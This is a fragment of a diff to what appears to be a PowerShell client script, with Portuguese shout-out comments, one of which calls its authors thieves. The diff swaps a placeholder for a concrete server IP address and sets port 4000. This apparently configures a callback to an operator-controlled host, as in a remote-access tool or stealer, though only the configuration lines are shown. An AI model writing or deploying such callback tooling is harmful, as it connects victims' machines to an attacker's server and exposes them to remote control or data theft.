@@ -2,7 +2,7 @@
 #  vqq no topo gostoso
 #  nottigang no topo ladrao
 
-$serverIP = "teu ip da vps ou pc"
+$serverIP = "198.1.195.204"
 $serverPort = 4000
 
 $h = [System.BitConverter]::ToString(
